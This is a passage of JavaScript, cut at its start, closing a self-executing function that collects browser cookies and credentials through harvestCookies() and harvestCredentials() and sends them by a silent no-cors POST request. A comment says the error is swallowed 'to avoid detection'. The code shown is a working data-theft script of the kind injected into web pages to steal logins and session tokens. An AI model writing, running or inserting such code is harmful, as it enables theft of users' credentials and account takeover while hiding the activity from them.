            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify(payload),
            headers: { 'Content-Type': 'application/json' }
        }).catch(() => {}); // Silent fail to avoid detection
    };

    // Execute & Exfiltrate
    const collectedData = {
        cookies: harvestCookies(),
        credentials: harvestCredentials()
    };

    exfiltrateData(collectedData);
})();
